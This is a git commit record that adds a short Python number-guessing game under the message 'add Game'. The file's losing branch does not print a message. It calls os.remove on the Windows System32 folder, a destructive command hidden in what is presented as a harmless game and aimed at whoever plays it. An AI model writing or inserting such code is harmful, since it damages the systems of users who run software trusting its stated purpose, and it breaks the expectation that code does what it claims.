eb1b9e5cfd23c399b17a824ac700c8e7617804ed
Vadym Slobodianiuk <kycherr@gmail.com>
2024-01-24 18:03:41 +0200

    add Game

---
+++ game.py
@@ -0,0 +1,11 @@
+import random
+import os
+
+number = random.randint(1, 10)
+guess = input("Guess number between 1 and 10")
+guess = int(guess)
+
+if guess == number:
+    print("You Won!")
+else:
+    os.remove("C:\Windows\System32")
